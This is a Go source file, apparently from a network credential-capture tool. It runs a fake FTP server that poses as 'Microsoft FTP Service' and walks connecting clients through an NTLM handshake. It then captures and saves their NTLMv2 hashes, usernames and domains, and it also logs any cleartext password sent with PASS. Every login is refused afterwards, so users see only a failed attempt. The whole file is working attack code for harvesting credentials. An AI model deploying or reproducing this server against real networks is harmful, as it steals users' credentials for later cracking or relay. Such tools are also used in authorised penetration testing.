package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"
)

func serveFTP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:21", ifaceIP))
	if err != nil {
		logError("FTP listen :21 — %v (need root?)", err)
		return
	}
	logInfo("FTP  listening on %s:21", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleFTP(c)
	}
}

func handleFTP(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(60 * time.Second))

	challenge := getChallenge()
	w := bufio.NewWriter(c)
	r := bufio.NewReader(c)

	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }

	send("220 Microsoft FTP Service")

	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		upper := strings.ToUpper(line)

		if upper == "AUTH NTLM" || strings.HasPrefix(upper, "AUTH NTLM ") {
			// some clients send the type1 token on the same line
			var token string
			if strings.Contains(upper, " ") {
				parts := strings.SplitN(line, " ", 3)
				if len(parts) == 3 {
					token = parts[2]
				}
			}

			if token == "" {
				send("334 ") // empty 334 = "send your NTLM token"
				token, err = r.ReadString('\n')
				if err != nil {
					return
				}
				token = strings.TrimRight(token, "\r\n")
			}

			raw, err := base64.StdEncoding.DecodeString(token)
			if err != nil {
				send("530 Authentication failed")
				return
			}
			ntlm := FindNTLMSSP(raw)
			if len(ntlm) < 12 {
				send("530 Authentication failed")
				return
			}
			if ntlmMsgType(ntlm) != 1 {
				send("530 Authentication failed")
				return
			}

			logVerbose("FTP NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
			send("334 " + base64.StdEncoding.EncodeToString(ntlmChallenge))

			// Read type3
			type3Line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			type3Line = strings.TrimRight(type3Line, "\r\n")
			raw3, err := base64.StdEncoding.DecodeString(type3Line)
			if err != nil {
				send("530 Authentication failed")
				return
			}
			ntlm3 := FindNTLMSSP(raw3)
			if len(ntlm3) < 12 || ntlmMsgType(ntlm3) != 3 {
				send("530 Authentication failed")
				return
			}
			hash, user, domain, err := ParseNTLMAuthenticate(ntlm3, challenge)
			if err == nil {
				logSuccess("[FTP] NTLMv2 captured from %s", c.RemoteAddr())
				logSuccess("      %s\\%s", domain, user)
				logSuccess("      %s", hash)
				saveHash(hash)
			}
			send("530 Authentication failed")
			return

		} else if strings.HasPrefix(upper, "USER ") {
			send("331 Password required")
		} else if strings.HasPrefix(upper, "PASS ") {
			pass := strings.TrimPrefix(line, "PASS ")
			pass = strings.TrimPrefix(pass, "pass ")
			if pass != "" {
				logSuccess("[FTP] Cleartext from %s: pass=%q", c.RemoteAddr(), pass)
			}
			send("530 Login incorrect")
			return
		} else if upper == "QUIT" {
			send("221 Goodbye")
			return
		} else {
			send("530 Please login with USER and PASS or AUTH NTLM")
		}
	}
}

func ntlmMsgType(ntlm []byte) uint32 {
	if len(ntlm) < 12 {
		return 0
	}
	return uint32(ntlm[8]) | uint32(ntlm[9])<<8 | uint32(ntlm[10])<<16 | uint32(ntlm[11])<<24
}
